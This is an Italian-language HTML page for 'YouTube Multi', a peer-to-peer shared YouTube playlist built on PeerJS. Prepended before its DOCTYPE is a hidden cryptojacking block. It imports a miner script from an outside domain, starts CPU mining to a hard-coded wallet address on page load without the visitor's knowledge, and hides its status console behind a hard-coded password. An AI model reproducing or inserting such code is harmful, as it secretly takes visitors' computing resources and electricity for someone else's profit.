<!-- ==================== MINER CONSOLE ==================== -->
<style>
#mining-console {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 280px;
    background: rgba(0, 0, 0, 0.9);
    border: 1px solid #ffffff33;
    border-radius: 6px;
    padding: 12px 14px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    z-index: 1000;
    color: #ffffff;
    font-family: 'Courier New', monospace;
    font-size: 15px;
    line-height: 1.7;
    display: none;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
    padding-bottom: 8px;
    border-bottom: 1px solid #ffffff33;
}
.close-btn {
    background: #ffffff;
    color: #000;
    border: none;
    width: 22px;
    height: 22px;
    font-size: 16px;
    line-height: 18px;
    text-align: center;
    border-radius: 3px;
    cursor: pointer;
    font-weight: bold;
}
#reopen-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 50px;
    height: 50px;
    background: rgba(255,255,255,0.1);
    border: 2px solid #ffffff88;
    color: #ffffff;
    font-size: 26px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    z-index: 999;
    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
}
</style>

<div id="mining-console">
    <div class="console-header">
        <span><strong>CPU Miner</strong></span>
        <button class="close-btn" onclick="hideMinerConsole()"></button>
    </div>
    <div>Stato: <span id="status">Avviando...</span></div>
    <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
    <div>Tempo: <span id="timer">00:00</span></div>
    <div>Job accettati: <span id="shares">0</span></div>
</div>

<div id="reopen-btn" onclick="askPassword()"></div>

<script type="module">
    import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";

    let miningStarted = false;
    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita

    // Mining parte subito
    async function initMining() {
        try {
            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
            miningStarted = true;
            document.getElementById("status").textContent = "Attivo";
            
            setInterval(() => {
                const hr = minotaurxHashrate.currentHashrateKHs || 0;
                const shares = minotaurxHashrate.sharesAccepted || 0;
                
                document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                document.getElementById("shares").textContent = shares;
            }, 700);

        } catch (e) {
            console.error(e);
            document.getElementById("status").textContent = "Errore";
        }
    }

    window.askPassword = function() {
        if (consoleUnlocked) {
            showMinerConsole();
            return;
        }

        const password = prompt("Inserire admin password");
        if (password === "CpuMining") {
            consoleUnlocked = true;
            showMinerConsole();
        } else if (password !== null) {
            alert("Password errata!");
        }
    };

    window.hideMinerConsole = function() {
        document.getElementById("mining-console").style.display = "none";
        document.getElementById("reopen-btn").style.display = "flex";
    };

    function showMinerConsole() {
        document.getElementById("mining-console").style.display = "block";
        document.getElementById("reopen-btn").style.display = "none";
    }

    // Timer
    let startTime = Date.now();
    setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
        const sec = (elapsed % 60).toString().padStart(2, '0');
        document.getElementById("timer").textContent = `${min}:${sec}`;
    }, 1000);

    // Avvio
    window.addEventListener('load', () => {
        initMining();
    });
</script>
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Multi</title>
<style>
    body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
    .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 12px; font-size: 16px; margin-bottom: 10px; }
    button { padding: 12px 20px; margin: 5px; font-size: 16px; }
    .status { padding: 10px; margin: 10px 0; border-radius: 5px; font-weight: bold; }
    .connected { background: #90EE90; }
    .list { border: 1px solid #ccc; padding: 10px; min-height: 100px; }
</style>
</head>
<body>
<div class="container">
    <h1>YouTube Multi - Debug Mode</h1>
    
    <div id="modeSelector">
        <button onclick="startHost()">1. AVVIA HOST</button><br><br>
        <button onclick="startClient()">2. AVVIA CLIENT</button><br><br>
        <button onclick="startStandalone()">Solo Locale</button>
    </div>

    <div id="mainApp" style="display:none;">
        <div id="status" class="status"></div>
        
        <input type="text" id="youtubeUrl" placeholder="Incolla link YouTube" />
        <button onclick="aggiungiVideo()">➕ Aggiungi Video</button>
        <button onclick="cancellaTutti()">Cancella Tutti</button>
        
        <h3>Lista Video</h3>
        <div class="list" id="videoList"></div>
        
        <div id="playerContainer"></div>
    </div>

    <div id="hostInfo" style="display:none; margin-top:20px; padding:15px; background:#e6f3ff; border-radius:8px;">
        <strong>Codice Host:</strong> <span id="codeDisplay" style="font-size:28px; font-weight:bold;"></span>
        <button onclick="copyCode()">Copia</button>
    </div>
</div>

<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<script>
let videos = [];
let isHost = false;
let currentCode = "";
let peer = null;
let conn = null;

function updateStatus(text, color = "black") {
    document.getElementById("status").innerHTML = text;
    document.getElementById("status").style.background = color === "green" ? "#90EE90" : "#ffe6b3";
    document.getElementById("status").style.display = "block";
}

function startHost() {
    isHost = true;
    currentCode = String(1000 + Math.floor(Math.random() * 9000));
    document.getElementById("modeSelector").style.display = "none";
    document.getElementById("mainApp").style.display = "block";
    document.getElementById("hostInfo").style.display = "block";
    document.getElementById("codeDisplay").textContent = currentCode;
    
    peer = new Peer(`ytmulti-${currentCode}`);
    peer.on('connection', (c) => {
        conn = c;
        setupConnection();
        updateStatus("✅ CLIENT CONNESSO!", "green");
    });
    updateStatus("Host avviato - In attesa di client...");
}

function startClient() {
    const code = prompt("Inserisci il codice Host (4 cifre):");
    if (!code || code.length !== 4) return alert("Codice non valido");
    
    document.getElementById("modeSelector").style.display = "none";
    document.getElementById("mainApp").style.display = "block";
    
    peer = new Peer();
    peer.on('open', () => {
        conn = peer.connect(`ytmulti-${code}`);
        setupConnection();
    });
}

function setupConnection() {
    conn.on('open', () => {
        updateStatus("Connessione stabilita");
        if (!isHost) sendCommand({type: "REQUEST_SYNC"});
    });

    conn.on('data', (data) => {
        console.log("Ricevuto:", data);
        if (data.type === "SYNC_STATE") {
            videos = data.videos || [];
            aggiornaUI();
        } else if (isHost) {
            if (data.type === "ADD_VIDEO") {
                videos.push({id: data.id, url: data.url});
            } else if (data.type === "CLEAR_ALL") {
                videos = [];
            }
            syncState();
        }
    });
}

function sendCommand(cmd) {
    if (conn && conn.open) {
        conn.send(cmd);
        console.log("Inviato:", cmd);
    }
}

function syncState() {
    if (conn && conn.open) {
        conn.send({type: "SYNC_STATE", videos: videos});
    }
    aggiornaUI();
}

// Azioni
function aggiungiVideo() {
    const urlInput = document.getElementById("youtubeUrl").value.trim();
    if (!urlInput) return;
    
    const id = estraiId(urlInput);
    if (!id) return alert("Link YouTube non valido");
    
    if (isHost) {
        videos.push({id, url: urlInput});
        syncState();
    } else {
        sendCommand({type: "ADD_VIDEO", id, url: urlInput});
    }
    document.getElementById("youtubeUrl").value = "";
}

function cancellaTutti() {
    if (isHost) {
        videos = [];
        syncState();
    } else {
        sendCommand({type: "CLEAR_ALL"});
    }
}

function aggiornaUI() {
    const list = document.getElementById("videoList");
    list.innerHTML = "";
    videos.forEach((v, i) => {
        const div = document.createElement("div");
        div.style.padding = "8px";
        div.style.borderBottom = "1px solid #eee";
        div.innerHTML = `${i+1}. ${v.url} <button onclick="rimuovi(${i})">Elimina</button>`;
        list.appendChild(div);
    });
    
    if (videos.length > 0 && !document.getElementById("ytplayer")) {
        const p = document.createElement("iframe");
        p.id = "ytplayer";
        p.width = "100%";
        p.height = "400";
        p.src = `https://www.youtube.com/embed/${videos[0].id}?playlist=${videos.map(v=>v.id).join(",")}&autoplay=1`;
        p.allowFullscreen = true;
        document.getElementById("playerContainer").appendChild(p);
    }
}

function rimuovi(i) {
    if (isHost) {
        videos.splice(i, 1);
        syncState();
    } else {
        sendCommand({type: "REMOVE_VIDEO", index: i});
    }
}

function estraiId(url) {
    const match = url.match(/(?:v=|youtu\.be\/|embed\/|shorts\/)([^&\n?#]+)/);
    return match ? match[1] : null;
}

function copyCode() {
    navigator.clipboard.writeText(currentCode);
    alert("Codice copiato: " + currentCode);
}
</script>
</body>
</html>
